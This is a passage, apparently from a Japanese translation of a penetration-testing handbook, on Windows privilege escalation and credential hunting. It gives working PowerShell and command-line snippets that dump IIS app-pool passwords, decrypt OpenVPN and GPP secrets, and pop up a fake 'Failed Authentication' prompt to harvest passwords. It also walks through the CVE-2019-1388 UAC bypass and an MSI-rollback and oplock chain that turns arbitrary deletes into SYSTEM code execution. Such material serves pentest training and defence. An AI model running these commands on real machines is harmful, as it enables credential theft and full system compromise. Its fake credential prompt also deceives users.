### 最近実行したコマンド
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **リモートデスクトップ資格情報マネージャー**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
`/masterkey` を適切に指定して **Mimikatz** の `dpapi::rdg` module を使用し、**任意の .rdg files を復号**する\
Mimikatz の `sekurlsa::dpapi` module を使用すると、メモリから **多数の DPAPI masterkeys を抽出**できる

### Sticky Notes

Windows workstation では、ユーザーが Sticky Notes app を使って **passwords** やその他の情報を**保存**していることがよくありますが、これは database file であることに気付いていません。この file は `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` にあり、常に検索して調査する価値があります。

### AppCmd.exe

**AppCmd.exe から passwords を復元するには、Administrator 権限が必要で、High Integrity level で実行する必要があることに注意してください。**\
**AppCmd.exe** は `%systemroot%\system32\inetsrv\` directory にあります。\
この file が存在する場合、いくつかの **credentials** が設定されており、**復元可能**である可能性があります。

この code は [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) から抽出されたものです:
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` が存在するか確認します。\
インストーラーは **SYSTEM 権限で実行され、多くは DLL Sideloading（情報元: ** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**）。**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Files and Registry（認証情報）

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### registry 内の SSH keys

SSH private keys は registry key `HKCU\Software\OpenSSH\Agent\Keys` 内に保存される可能性があるため、そこに興味深いものがないか確認してください:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
そのパス内にエントリが見つかった場合、それはおそらく保存された SSH key です。暗号化されて保存されていますが、[https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract)を使用して簡単に復号できます。\
この technique の詳細については、[https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

`ssh-agent` サービスが実行されておらず、ブート時に自動的に起動したい場合は、次を実行します:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> この technique はもう有効ではないようです。いくつかの ssh keys を作成し、`ssh-add` で追加してから、ssh 経由でマシンにログインしようとしました。レジストリ HKCU\Software\OpenSSH\Agent\Keys は存在せず、非対称鍵認証中に `dpapi.dll` が使用されたことを procmon で特定できませんでした。

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
これらのファイルは **metasploit** を使用して検索することもできます: _post/windows/gather/enum_unattend_

内容の例:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM のバックアップ
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud 認証情報
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

**SiteList.xml** という名前のファイルを検索します。

### Cached GPP Password

以前は、Group Policy Preferences (GPP) を介して、複数のマシンにカスタムのローカル administrator アカウントを展開できる機能がありました。しかし、この方法には重大な security flaw がありました。第一に、SYSVOL に XML ファイルとして保存されている Group Policy Objects (GPOs) に、あらゆる domain user がアクセスできました。第二に、公開されているデフォルトキーを使用して AES256 で暗号化されたこれらの GPP 内の password は、認証済みユーザーであれば誰でも復号できました。これにより、ユーザーが elevated privileges を取得できる深刻なリスクが生じていました。

このリスクを軽減するため、空ではない `"cpassword"` フィールドを含む、ローカルに cached された GPP ファイルを検索する function が開発されました。そのようなファイルが見つかると、function は password を復号し、カスタムの PowerShell object を返します。この object には GPP とファイルの場所に関する詳細が含まれており、この security vulnerability の特定と remediation に役立ちます。

`C:\ProgramData\Microsoft\Group Policy\history` または _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista より前)_ で、以下のファイルを検索します。

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword を復号するには:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexecを使用してパスワードを取得する：
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
認証情報を含む web.config の例:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN credentials (認証情報)
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### ログ
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### 認証情報を尋ねる

ユーザーが知っている可能性があると思う場合は、いつでも**そのユーザー自身の認証情報、または別のユーザーの認証情報を入力するよう依頼できます**（クライアントに直接**認証情報**を尋ねることは非常に**危険**であることに注意してください）：
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **認証情報を含む可能性のあるファイル名**

以前、**passwords** が **clear-text** または **Base64** で含まれていた既知のファイル
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
提案されたすべてのファイルを検索：
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### ごみ箱内の認証情報

認証情報がないか、ごみ箱内も確認してください

複数のプログラムで保存された**パスワードを復元**するには、次を使用できます: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### レジストリ内

**認証情報を含むその他の可能性のあるレジストリキー**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**レジストリから openssh keys を抽出する。**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ブラウザーの履歴

**Chrome または Firefox** のパスワードが保存されている dbs を確認します。\
また、ブラウザーの履歴、ブックマーク、お気に入りも確認してください。そこに**パスワードが**保存されている可能性があります。

ブラウザーからパスワードを抽出する Tools:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** は Windows operating system に組み込まれた technology で、異なる言語で作成された software components 間の**相互通信**を可能にします。各 COM component は **class ID (CLSID)** によって**識別**され、各 component は 1 つ以上の interfaces を通じて機能を公開します。interfaces は interface IDs (IIDs) によって識別されます。

COM classes と interfaces は、それぞれ **HKEY\CLASSES\ROOT\CLSID** と **HKEY\CLASSES\ROOT\Interface** の registry に定義されています。この registry は **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT** をマージして作成されます。

この registry の CLSIDs 内には、子 registry **InProcServer32** があります。ここには **DLL** を指す**デフォルト値**と、**ThreadingModel** という値が含まれています。ThreadingModel には **Apartment** (Single-Threaded)、**Free** (Multi-Threaded)、**Both** (Single または Multi)、**Neutral** (Thread Neutral) を指定できます。

![ブラウザーの履歴 - COM DLL Overwriting: この registry の CLSIDs 内には子 registry InProcServer32 があり、DLL を指すデフォルト値と値... が含まれています](<../../images/image (729).png>)

基本的に、実行される予定の**DLL のいずれかを overwrite** でき、その DLL が別の user によって実行される場合、**privileges を escalate** できます。

attacker が persistence mechanism として COM Hijacking を使用する方法については、以下を確認してください:


{{#ref}}
com-hijacking.md
{{#endref}}

### **ファイルおよび registry 内の Generic Password search**

**ファイルの内容を検索する**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**特定のファイル名を持つファイルを検索**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**レジストリでキー名とパスワードを検索する**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### パスワードを検索する Tools

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **は msf** plugin で、victim 内の credentials を検索するすべての metasploit POST module を**自動的に実行**するために私が作成しました。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) は、このページで言及されているパスワードを含むすべてのファイルを自動的に検索します。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) は、system から password を抽出するための、もう1つの優れた tool です。

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) tool は、これらのデータを平文で保存する複数の tool（PuTTY、WinSCP、FileZilla、SuperPuTTY、RDP）の **sessions**、**usernames**、**passwords** を検索します。
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## 漏洩したハンドル

**SYSTEM として実行されているプロセスが、フルアクセスで新しいプロセスを開く** (`OpenProcess()`) とします。同じプロセスが、**main process のすべての open handles を継承する、low privileges の新しいプロセスを作成** (`CreateProcess()`) します。\
その後、**low privileged process への full access** を持っている場合、`OpenProcess()` で作成された **privileged process への open handle** を取得し、**shellcode を inject** できます。\
**この vulnerability の検出および exploit 方法**の詳細については、[この例](leaked-handle-exploitation.md)を参照してください。\
**異なる permission level（full access のみではありません）で継承された、process や thread のより多くの open handles をテストおよび abuse する方法についての、より完全な説明**については、[**こちらの別の post**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)を参照してください。

## Named Pipe Client Impersonation

**pipes** と呼ばれる shared memory segments により、process 間の communication と data transfer が可能になります。

Windows には **Named Pipes** と呼ばれる feature があり、関連のない process 同士でも、異なる network 越しに data を共有できます。これは client/server architecture に似ており、役割は **named pipe server** と **named pipe client** として定義されます。

**client** が pipe 経由で data を送信すると、pipe を setup した **server** は、必要な **SeImpersonate** rights を持っている場合、**client** の **identity を引き受ける**ことができます。模倣可能な pipe を介して communication する **privileged process** を特定できれば、自分で確立した pipe とその process がやり取りした時点で、その process の identity を引き受けることにより、**higher privileges を取得**できる可能性があります。この attack の実行手順については、[**こちら**](named-pipe-client-impersonation.md)および[**こちら**](#from-high-integrity-to-system)の guide を参照してください。

また、次の tool を使用すると、**burp のような tool で named pipe communication を intercept** できます：[**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **さらに次の tool を使用すると、すべての pipe を list および確認して privescs を見つけることができます**：[**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Telephony service (TapiSrv) は server mode で `\\pipe\\tapsrv` (MS-TRP) を公開します。remote authenticated client は、mailslot-based async event path を abuse して、`ClientAttach` を `NETWORK SERVICE` が writable な既存ファイルへの任意の **4-byte write** に変換し、その後 Telephony admin rights を取得して、service として任意の DLL を load できます。全体の flow は次のとおりです。

- `pszDomainUser` に writable な既存 path を設定して `ClientAttach` を実行 → service は `CreateFileW(..., OPEN_EXISTING)` でその path を開き、async event writes に使用します。
- 各 event は、`Initialize` から attacker-controlled な `InitContext` をその handle に write します。`LRegisterRequestRecipient` (`Req_Func 61`) で line app を register し、`TRequestMakeCall` (`Req_Func 121`) を trigger し、`GetAsyncEvents` (`Req_Func 0`) で取得した後、unregister/shutdown して deterministic writes を繰り返します。
- `C:\Windows\TAPI\tsec.ini` の `[TapiAdministrators]` に自分自身を追加して reconnect し、任意の DLL path を指定して `GetUIDllName` を call すると、`NETWORK SERVICE` として `TSPI_providerUIIdentify` が実行されます。

詳細：

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### Windows で stuff を実行できる File Extensions

**[https://filesec.io/](https://filesec.io/)** の page を確認してください。

### Markdown renderer 経由の Protocol handler / ShellExecute abuse

`ShellExecuteExW` に forward された Clickable Markdown links は、危険な URI handlers (`file:`, `ms-appinstaller:`、または登録済みの scheme) を trigger し、current user として attacker-controlled files を execute できます。詳細：

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **password の Command Lines を Monitoring**

user として shell を取得した場合、**command line で credentials を渡す** scheduled tasks やその他の process が実行されていることがあります。以下の script は、2 秒ごとに process command lines を capture し、current state と previous state を比較して、差分を出力します。
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## プロセスからパスワードを盗む

## 低権限ユーザーから NT\AUTHORITY SYSTEM へ（CVE-2019-1388）/ UAC Bypass

グラフィカルインターフェース（console または RDP 経由）にアクセスでき、UAC が有効になっている場合、Microsoft Windows の一部のバージョンでは、権限のないユーザーからターミナルやその他のプロセスを「NT\AUTHORITY SYSTEM」として実行できます。

これにより、同じ脆弱性を使って権限を昇格し、同時に UAC を bypass できます。さらに、何もインストールする必要がなく、処理中に使用される binary は Microsoft によって署名および発行されています。

影響を受けるシステムの一部は以下のとおりです。
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
この脆弱性を悪用するには、以下の手順を実行する必要があります。
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Administrator Medium から High Integrity Level / UAC Bypass へ

これを読んで **Integrity Levels について学んでください**:


{{#ref}}
integrity-levels.md
{{#endref}}

次に、**UAC と UAC bypasses について学ぶため、こちらを読んでください:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Arbitrary Folder Delete/Move/Rename から SYSTEM EoP へ

[**この blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) で説明されている technique で、exploit code は[**こちらで入手できます**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)。<sup>[[31]](#references)[[32]](#references)</sup>

この attack は基本的に、Windows Installer の rollback feature を悪用し、uninstallation process 中に正規の files を malicious files へ置き換えるものです。そのため attacker は、**malicious MSI installer** を作成する必要があります。この installer は `C:\Config.Msi` folder を hijack するために使用されます。この folder は後から Windows Installer によって、他の MSI packages の uninstallation 中に rollback files を保存するために使用されます。rollback files は malicious payload を含むように変更されます。

この technique の概要は次のとおりです:

1. **Stage 1 – Hijack の準備 (`C:\Config.Msi` を空にする)**

- Step 1: MSI を install
- Writable folder (`TARGETDIR`) に harmless file (例: `dummy.txt`) を install する `.msi` を作成します。
- **"UAC Compliant"** として installer を設定し、**non-admin user** が実行できるようにします。
- install 後も file への **handle** を open のままにします。

- Step 2: Uninstall を開始
- 同じ `.msi` を uninstall します。
- Uninstall process は files を `C:\Config.Msi` に移動し始め、`.rbf` files (rollback backups) に rename します。
- `GetFinalPathNameByHandle` を使用して **open file handle を poll** し、file が `C:\Config.Msi\<random>.rbf` になったことを検出します。

- Step 3: Custom Syncing
- `.msi` には **custom uninstall action (`SyncOnRbfWritten`)** が含まれており、次の処理を行います:
- `.rbf` が書き込まれたことを signal します。
- その後、uninstall を継続する前に別の event を wait します。

- Step 4: `.rbf` の削除を block
- signal を受信したら、`FILE_SHARE_DELETE` なしで **`.rbf file を open** します。これにより **削除されなくなります**。
- 次に、uninstall が完了できるよう **signal を返します**。
- Windows Installer は `.rbf` の削除に失敗し、すべての contents を削除できないため、**`C:\Config.Msi` は削除されません**。

- Step 5: `.rbf` を手動で削除
- あなた (attacker) が `.rbf` file を手動で削除します。
- これで **`C:\Config.Msi` は空**になり、hijack の準備が整います。

> この時点で、**SYSTEM-level arbitrary folder delete vulnerability を trigger** して `C:\Config.Msi` を削除します。

2. **Stage 2 – Rollback Scripts を Malicious なものに置き換える**

- Step 6: Weak ACLs を設定して `C:\Config.Msi` を再作成
- `C:\Config.Msi` folder を自分で再作成します。
- **weak DACLs** (例: Everyone:F) を設定し、`WRITE_DAC` を持つ **handle を open のままにします**。

- Step 7: 別の Install を実行
- 次の設定で `.msi` を再度 install します:
- `TARGETDIR`: Writable location。
- `ERROROUT`: forced failure を trigger する variable。
- この install は、`.rbs` と `.rbf` を読み取る **rollback** を再度 trigger するために使用されます。

- Step 8: `.rbs` を monitor
- `ReadDirectoryChangesW` を使用して `C:\Config.Msi` を monitor し、新しい `.rbs` が出現するまで待ちます。
- その filename を取得します。

- Step 9: Rollback 前に Sync
- `.msi` には **custom install action (`SyncBeforeRollback`)** が含まれており、次の処理を行います:
- `.rbs` が作成されたときに event を signal します。
- その後、続行する前に wait します。

- Step 10: Weak ACL を再適用
- `.rbs created` event を受信した後:
- Windows Installer は `C:\Config.Msi` に **strong ACLs を再適用**します。
- しかし、`WRITE_DAC` を持つ handle をまだ保持しているため、**weak ACLs を再適用**できます。

> ACLs は **handle open 時にのみ enforce される**ため、引き続き folder に write できます。

- Step 11: Fake `.rbs` と `.rbf` を配置
- `.rbs` file を **fake rollback script** で overwrite します。この script は Windows に対して次の処理を指示します:
- `.rbf` file (malicious DLL) を **privileged location** (例: `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`) に restore します。
- **malicious SYSTEM-level payload DLL** を含む fake `.rbf` を配置します。

- Step 12: Rollback を trigger
- sync event を signal して installer を resume させます。
- **type 19 custom action (`ErrorOut`)** は、既知の point で install を **意図的に fail** させるよう設定されています。
- これにより **rollback が開始**します。

- Step 13: SYSTEM が DLL を install
- Windows Installer は:
- malicious `.rbs` を読み取ります。
- `.rbf` DLL を target location に copy します。
- これで **SYSTEM が load する path に malicious DLL** が配置されます。

- Final Step: SYSTEM code を execute
- hijack した DLL を load する、trusted **auto-elevated binary** (例: `osk.exe`) を実行します。
- **Boom**: code が **SYSTEM として実行**されます。


### Arbitrary File Delete/Move/Rename から SYSTEM EoP へ

主要な MSI rollback technique (前述のもの) は、**entire folder** (例: `C:\Config.Msi`) を削除できることを前提としています。しかし、vulnerability が **arbitrary file deletion** しか許可しない場合はどうでしょうか？

**NTFS internals** を exploit できます。すべての folder には、次の名前の hidden alternate data stream があります:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
この stream には、フォルダの **index metadata** が保存されています。

そのため、フォルダの **`::$INDEX_ALLOCATION` stream** を**削除**すると、NTFS はファイルシステムから**フォルダ全体を削除**します。

これは、次のような標準のファイル削除 API を使用して実行できます：
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> *file* delete API を呼び出しているにもかかわらず、**フォルダー自体が削除されます**。

### フォルダー内容の削除から SYSTEM EoP へ
primitive では任意のファイルやフォルダーを削除できないが、**攻撃者が制御するフォルダーの *内容* は削除できる**場合はどうでしょうか？

1. Step 1: 囮フォルダーとファイルをセットアップする
- 作成: `C:\temp\folder1`
- その中に作成: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` に **oplock** を設定する
- 特権プロセスが `file1.txt` を削除しようとすると、oplock により **実行が一時停止します**。
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Step 3: SYSTEM process（例: `SilentCleanup`）をトリガーする
- このプロセスはフォルダー（例: `%TEMP%`）をスキャンし、その内容を削除しようとします。
- `file1.txt` に到達すると、**oplock がトリガーされ**、制御がコールバックに渡されます。

4. Step 4: oplock callback 内で削除先をリダイレクトする

- Option A: `file1.txt` を別の場所へ移動する
- これにより、oplock を解除せずに `folder1` が空になります。
- `file1.txt` を直接削除しないでください。削除すると、oplock が早期に解除されます。

- Option B: `folder1` を **junction** に変換する:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- オプション C: `\RPC Control` に **symlink** を作成する:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
